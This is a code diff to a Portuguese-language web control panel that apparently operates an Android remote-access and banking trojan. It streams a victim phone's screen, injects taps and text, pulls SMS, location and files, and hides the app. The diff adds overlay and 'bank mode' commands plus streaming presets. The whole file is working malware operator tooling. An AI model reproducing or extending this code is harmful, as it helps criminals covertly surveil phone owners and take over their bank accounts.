@@ -39,6 +39,8 @@ input{flex:1;cursor:text}
 .dot.on{background:#3fb950}.dot.warn{background:#d29922}
 .row{display:flex;justify-content:space-between;gap:6px;padding:2px 0;border-bottom:1px solid #1a2028;cursor:pointer}
 .row:hover{background:#161c23}
+.tap{position:fixed;width:20px;height:20px;margin:-10px 0 0 -10px;border:2px solid #58a6ff;border-radius:50%;pointer-events:none;animation:f .42s ease-out forwards}
+@keyframes f{to{transform:scale(1.7);opacity:0}}
 </style>
 <header>
 <select id=dev><option value="">-- aparelho --</option></select><span id=dot class=dot></span>
@@ -50,7 +52,9 @@ input{flex:1;cursor:text}
 <button onclick="c('sms')">SMS</button><button onclick="c('loc')">Local</button>
 <button onclick="c('torch',{on:true})">Luz</button><button onclick="c('torch',{on:false})">Luz off</button>
 <button onclick="c('hide',{on:true})">Ocultar</button><button onclick="c('hide',{on:false})">Mostrar</button>
-<button onclick="shot()">Salvar</button><button onclick="rec()">Gravar</button><button onclick="full()">Tela cheia</button>
+<button onclick="preset(1)">Rapido</button><button onclick="preset(2)">Nitido</button>
+<button onclick="c('ov',{on:true})">Overlay</button><button onclick="c('ov',{on:false})">Overlay off</button>
+<button onclick="c('bank')">Modo banco</button><button onclick="shot()">Salvar</button><button onclick="rec()">Gravar</button><button onclick="full()">Tela cheia</button>
 </header>
 <main><div id=wrap><img id=scr><div id=st></div></div>
 <aside>
@@ -60,8 +64,8 @@ input{flex:1;cursor:text}
 <pre id=out></pre>
 </div>
 <div style="padding:5px;border-top:1px solid #232b35">
-<div class=ln>Q<input id=q type=range min=15 max=90 value=40 oninput="c('q',{v:+this.value})"></div>
-<div class=ln>FPS<input id=f type=range min=1 max=15 value=4 oninput="c('fps',{v:+this.value})"></div>
+<div class=ln>Q<input id=q type=range min=15 max=90 value=35 oninput="c('q',{v:+this.value})"></div>
+<div class=ln>FPS<input id=f type=range min=1 max=15 value=6 oninput="c('fps',{v:+this.value})"></div>
 <div class=ln>Res<input id=r type=range min=360 max=1080 step=180 value=540 oninput="c('res',{v:+this.value})"></div>
 </div>
 </aside></main>
@@ -123,15 +127,26 @@ function send(){const e=$('#t'),v=e.value;if(!v)return;
   else if(v.startsWith('/dl '))c('dl',{p:v.slice(4)});
   else c('text',{s:v});e.value=''}
 $('#t').onkeydown=e=>{if(e.key==='Enter')send()};
-function pt(e){const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
-  return{x:Math.round((e.clientX-r.left)*nx/r.width*(inf.w?inf.w/nx:1)),
-         y:Math.round((e.clientY-r.top)*ny/r.height*(inf.h?inf.h/ny:1))}}
+function pt(e){
+  const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
+  const s=Math.min(r.width/nx,r.height/ny)||1;
+  const ox=r.left+(r.width-nx*s)/2, oy=r.top+(r.height-ny*s)/2;
+  const x=Math.round((e.clientX-ox)/s*((inf.w||nx)/nx));
+  const y=Math.round((e.clientY-oy)/s*((inf.h||ny)/ny));
+  return{x:Math.min(Math.max(0,x),inf.w||x),y:Math.min(Math.max(0,y),inf.h||y)}}
 let dn=null,t0=0;
-i.onmousedown=e=>{dn=pt(e);t0=Date.now()};
+function mark(p){
+  const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
+  const s=Math.min(r.width/nx,r.height/ny)||1;
+  const d=document.createElement('div');d.className='tap';
+  d.style.left=(r.left+(r.width-nx*s)/2+p.x/((inf.w||nx)/nx)*s)+'px';
+  d.style.top=(r.top+(r.height-ny*s)/2+p.y/((inf.h||ny)/ny)*s)+'px';
+  document.body.appendChild(d);setTimeout(()=>d.remove(),420)}
+i.onmousedown=e=>{dn=pt(e);t0=Date.now();mark(dn)};
 i.onmouseup=e=>{if(!dn)return;const u=pt(e),m=Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y);
-  if(m<12&&Date.now()-t0>600)c('long',{x:u.x,y:u.y});
-  else if(m<12)c('touch',{x:u.x,y:u.y});
-  else c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:260});dn=null};
+  if(m<18&&Date.now()-t0>480)c('long',{x:u.x,y:u.y});
+  else if(m<18)c('touch',{x:u.x,y:u.y});
+  else c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:220});dn=null};
 function shot(){const a=document.createElement('a');a.href=i.src;a.download='tela.jpg';a.click()}
 function full(){document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen()}
 function rec(){
@@ -169,6 +184,9 @@ function baixa(o){
   const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([u]));
   a.download=(pasta.split('/').pop()||'arq');a.click();log('baixado')
 }
+function preset(n){const q=$('#q'),f=$('#f'),r=$('#r');
+  if(n===1){q.value=30;f.value=10;r.value=360}else{q.value=55;f.value=6;r.value=720}
+  c('q',{v:+q.value});c('fps',{v:+f.value});c('res',{v:+r.value})}
 co();
 </script>"""
 
